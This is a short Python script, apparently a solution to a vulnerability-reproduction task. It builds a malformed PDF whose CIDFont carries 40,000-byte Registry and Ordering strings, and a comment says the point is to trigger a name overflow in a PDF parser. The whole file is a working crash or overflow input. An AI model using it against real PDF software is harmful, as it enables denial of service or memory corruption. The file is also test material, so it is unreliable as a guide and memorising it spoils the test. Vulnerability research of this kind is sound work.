import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        def b(s):
            if isinstance(s, bytes):
                return s
            return s.encode('ascii')
        # Large strings to trigger fallback name overflow: "<Registry>-<Ordering>"
        reg_len = 40000
        ord_len = 40000
        registry = b'R' * reg_len
        ordering = b'O' * ord_len

        # PDF objects
        objs = {}

        # 1: Catalog
        objs[1] = b"<< /Type /Catalog /Pages 2 0 R >>"

        # 2: Pages
        objs[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"

        # 3: Page
        objs[3] = b"<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 200 200] /Contents 5 0 R >>"

        # 4: Type0 Font referencing CIDFont
        objs[4] = b"<< /Type /Font /Subtype /Type0 /BaseFont /F1Base /Name /F1 /Encoding /Identity-H /DescendantFonts [6 0 R] >>"

        # 5: Content stream using F1
        content_stream = b"BT /F1 12 Tf (Hello) Tj ET"
        objs[5] = b"<< /Length " + b(str(len(content_stream))) + b" >>\nstream\n" + content_stream + b"\nendstream"

        # 6: CIDFont with oversized CIDSystemInfo
        cid_info = b"<< /Registry (" + registry + b") /Ordering (" + ordering + b") /Supplement 0 >>"
        objs[6] = b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /F1Base /CIDSystemInfo " + cid_info + b" /DW 1000 >>"

        # Build PDF
        out = io.BytesIO()
        # PDF header with binary comment line
        out.write(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")

        offsets = {}
        # Write objects in order
        max_obj = max(objs.keys())
        for i in range(1, max_obj + 1):
            offsets[i] = out.tell()
            out.write(b(str(i) + " 0 obj\n"))
            out.write(objs[i])
            out.write(b"\nendobj\n")

        # xref
        xref_pos = out.tell()
        out.write(b"xref\n")
        out.write(b"0 " + b(str(max_obj + 1)) + b"\n")
        out.write(b"0000000000 65535 f \n")
        for i in range(1, max_obj + 1):
            off = offsets[i]
            out.write(b(f"{off:010d} 00000 n \n"))

        # trailer
        out.write(b"trailer\n")
        out.write(b"<< /Size " + b(str(max_obj + 1)) + b" /Root 1 0 R >>\n")
        out.write(b"startxref\n")
        out.write(b(str(xref_pos) + "\n"))
        out.write(b"%%EOF\n")

        return out.getvalue()
